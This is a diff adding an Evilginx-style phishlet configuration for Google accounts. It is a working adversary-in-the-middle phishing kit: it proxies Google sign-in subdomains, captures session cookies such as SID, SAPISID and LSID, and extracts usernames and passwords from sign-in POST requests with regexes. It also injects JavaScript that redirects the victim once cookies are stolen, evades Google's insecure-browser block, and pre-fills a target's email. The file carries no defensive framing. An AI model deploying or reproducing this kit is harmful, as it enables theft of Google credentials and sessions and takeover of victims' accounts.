@@ -1,0 +1,90 @@
+min_ver: '3.0.0'
+author: '@an0nud4y'
+redirect_url: 'https://mail.google.com'
+
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ogs', orig_sub: 'ogs', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>var redirectCount=0,maxRedirects=3,targetDomain="https://mail.google.com";function checkCookies(){document.cookie.includes("SID")&&document.cookie.includes("APISID")&&document.cookie.includes("SAPISID")?window.location.hostname!==targetDomain?window.location.href=targetDomain:cancelAnimationFrame(animationId):++redirectCount>=maxRedirects&&cancelAnimationFrame(animationId)}document.addEventListener("DOMContentLoaded",(function(){checkCookies(),animationId=requestAnimationFrame((function e(){checkCookies(),animationId=requestAnimationFrame(e)}))}));</script></body>', mimes: ['text/html']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>!function(){function e(){var t=document.body.textContent||document.body.innerText,n=window.location.href.includes("v3/signin/rejected");t.includes("This browser or app may not be secure.")&&n&&(window.location.href="/")}document.addEventListener("DOMContentLoaded",e),window.addEventListener("load",e),setTimeout(e,2e3)}();</script></body>', mimes: ['text/html']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html']}
+
+auth_tokens:
+  - domain: '.google.com'
+    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'NID', 'OGPC', 'OGP', '1P_JAR', 'CONSENT', 'SMSV', '.*,regexp']
+  - domain: 'accounts.google.com'
+    keys: ['GAPS', 'LSID', '_utmt', 'utmz', '_utmb', 'ACCOUNT_CHOOSER', '.*,regexp']
+
+auth_urls:
+  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
+  - '/CheckCookie'
+  - '/ManageAccount'
+  - '/'
+
+credentials:
+  username:
+    key: 'f.req'
+    search: '\[\[\["V1UmUe","\[null,\\"(.*?)\\"'
+    type: 'post'
+  password:
+    key: 'f.req'
+    search: '\[1,1,null,\[1,null,null,null,\[\\"(.*?)\\",null,1\]\]'
+    type: 'post'
+
+force_post:
+  - path: 'selectchallenge'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+  - path: '/signin'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+      - {key: 'bghash', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+  - path: 'speedbump'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+login:
+  domain: 'accounts.google.com'
+  path: '/v3/signin/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+
+js_inject:
+  - trigger_domains: ['accounts.google.com']
+    trigger_paths: ['^/v3/signin/.*', '^/signin/.*', '^/$', '^/changepassword$']
+    script: |
+      (function(){
+        var email = '{email}';
+        function fillAndNext(){
+          if (email) {
+            var field = document.querySelector('#identifierId') || document.querySelector('input[name="identifier"]');
+            if (field && !field.value) {
+              field.value = email;
+              field.dispatchEvent(new Event('input', {bubbles:true}));
+            }
+            var next = document.querySelector('#identifierNext');
+            if (next && field && field.value) next.click();
+          }
+        }
+        document.addEventListener('DOMContentLoaded', fillAndNext);
+        setTimeout(fillAndNext, 800);
+      })();
